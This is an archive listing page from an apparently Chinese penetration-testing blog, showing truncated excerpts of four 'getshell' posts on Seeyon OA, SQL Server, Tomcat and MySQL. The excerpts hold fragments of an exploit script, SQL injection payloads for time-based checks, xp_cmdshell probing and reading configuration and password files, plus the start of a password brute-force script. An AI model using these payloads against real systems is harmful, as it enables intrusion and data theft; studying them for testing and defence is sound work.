@@ -1,0 +1,741 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>getshell - Reber's Blog</title>
+    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
+    <meta name="author" content="reber">
+    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
+    <!--[if lte IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
+    <![endif]-->
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
+    <!--<![endif]-->
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
+    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
+    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
+    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
+    <script src="/js/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script src="/js/jquery.min.js"></script>
+</head>
+<body>
+
+
+
+<div class="reber">
+    
+<div class="head">
+    <h1 class="logo" id="logo">
+        <a href="/"><img src='/img/logo.png' width='70px'></a>
+    </h1>
+    <ul class="nav">
+        
+            
+                <li>
+                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+            
+                </li>
+        
+    </ul>
+</div>
+
+    
+    <div class="main">
+        <div class="left">
+            
+            <div class="content">
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/">致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2019-06-29
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/getshell">getshell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 影响版本  致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件 V7.1  0x01 查看接口看是否存在漏洞 如果查看 &quot;seeyon/htmlofficeservlet&quot; 接口，出现如下内容则表示存在漏洞 0x02 POC &amp; EXP #!/usr/bin/env python # -*- coding: utf-8 -*- import time import random import string import requests info = { &quot;name&quot;: &quot;致远 A8 可 getshell&quot;, &quot;author&quot;: &quot;reber&quot;, &quot;version&quot;: &quot;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&quot;, &quot;type&quot;: &quot;file_upload&quot;, &quot;level&quot;: &quot;high&quot;, &quot;result&quot;: &quot;&quot;, &quot;status&quot;: False, &quot;references&quot;: &quot;&lt;url&gt;&quot;, &quot;desc&quot;: &quot;&lt;vul describtion&gt;&quot;, } def assign(service, arg): if service == 'seeyon': return True, arg def encode(origin_bytes): &quot;&quot;&quot; 重构 base64 编码函数 &quot;&quot;&quot; # 将每一位bytes转换为二进制字符串 base64_charset = &quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot; base64_bytes = ['{:0&gt;8}'.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2019/seeyon-htmlofficeservlet-getshell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/">从 SQL Server 注入到 getshell</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2019-03-02
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/pentest">pentest</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/getshell">getshell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
+另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
+burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
+[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&lt;也可用sqlmap的&ndash;is-dba判断&gt;)  uname=test';if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2';--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--   查看是否有xp_cmdshell  uname=test';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2019/sql-server-from-injection-to-getshell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/">Tomcat部署War包getshell</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-08-02
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/getshell">getshell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 关于 War 包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。  0x01 上传 War 包 GetShell  找到后台猜密码然后登录  上传 War 包
+  运行 jar -cf job.war ./job.jsp 生成 war 包
+或者先将 jsp 大马压缩为 zip，再将 zip 后缀改名为 war ，然后上传 war 包
+0x02 漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &quot;&quot;&quot; 简单爆破后台登陆密码 Usage: python tomcat.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/tomcat-deploy-war-package-to-getshell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/injection-of-mysql-function/">SQL注入之load_file和into outfile(MySQL)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-06-20
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/getshell">getshell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 load_file() 读文件  条件:  1. 要有file_priv权限: show global variables like '%secure%'; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
+ 读/etc/init.d下的东西，这里有配置文件路径
+?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
+?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
+?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 load data local infile 读文件  条件:  MySQL8 中需要 SET GLOBAL local_infile=1;   语句  LOAD DATA LOCAL INFILE 'D:/pet.txt' INTO TABLE pet FIELDS TERMINATED BY ''; select * from pet;  0x02 into outfile getshell  条件：  1.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/injection-of-mysql-function/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+
+                
+
+
+
+            </div>
+        </div>
+        <div class="right">
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Categorie<a href="/single/index.html" class="single" target="_blank">s</a></h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/database" title="database">database(12)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/git" title="git">git(6)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/linux" title="linux">linux(26)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/other" title="other">other(14)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/php" title="php">php(12)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/python" title="python">python(32)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/server" title="server">server(10)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/windows" title="windows">windows(4)</a>
+            </li>
+        
+    </ul>
+
+
+</div>
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Tags</h2>
+    <div class="taglist" id="tags">
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/ajax" title="ajax">ajax</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/cgi" title="cgi">cgi</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/csrf" title="csrf">csrf</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/des" title="des">des</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/dmz" title="dmz">dmz</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/docker" title="docker">docker</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/getshell" title="getshell">getshell</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/git" title="git">git</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/https" title="https">https</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/injection" title="injection">injection</a>
+                <sup>18</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/intranet" title="intranet">intranet</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/javascript" title="javascript">javascript</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/module" title="module">module</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/mysql" title="mysql">mysql</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/oracle" title="oracle">oracle</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/pentest" title="pentest">pentest</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/php" title="php">php</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/poc" title="poc">poc</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/postgresql" title="postgresql">postgresql</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/python" title="python">python</a>
+                <sup>30</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/rce" title="rce">rce</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/redis" title="redis">redis</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/server" title="server">server</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/software" title="software">software</a>
+                <sup>8</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/ssh%e9%9a%a7%e9%81%93" title="ssh隧道">ssh隧道</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/thread" title="thread">thread</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/tools" title="tools">tools</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/tornado" title="tornado">tornado</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/wireless" title="wireless">wireless</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/xml" title="xml">xml</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/xss" title="xss">xss</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" title="代码审计">代码审计</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%a4%be%e5%b7%a5" title="社工">社工</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
+                <sup>1</sup>
+            </p>
+        
+    </div>
+
+
+</div>
+
+            
+
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Links</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://y-hkl.github.io/" target="_blank">Y-HKL's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://s.yl0.org/" target="_blank">sòng•sec</a>
+        </li>
+    </ul>
+</div>
+
+            
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Social</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-github-square fa-fw"></i><a href="https://github.com/reber0" target="_blank">GitHub</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-weibo fa-fw"></i><a href="http://weibo.com/u/5819760166" target="_blank">Weibo</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-rss fa-fw"></i><a href="https://wyb0.com/index.xml" target="_blank">RSS</a>
+        </li>
+    </ul>
+</div>
+        </div>
+    </div>
+
+    <br><br>
+    
+<div class="foot">
+    <div class="copyright">
+        
+        Copyright &copy; 2015-<script>var d=new Date();document.write(d.getFullYear());</script> Reber. All Rights Reserved.
+
+        
+        <script type="text/javascript" src="https://js.users.51.la/20938483.js"></script>
+    </div>
+    <script>$('.copyright img').remove();</script>
+</div>
+</div>
+
+    
+    <div class="goToTop">
+      <a href="#top" id="goToTop">
+        <img src="https://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
+      </a>
+    </div>
+
+    <script src="/js/style.js"></script>
+
+    
+    
+
+</body>
+</html>
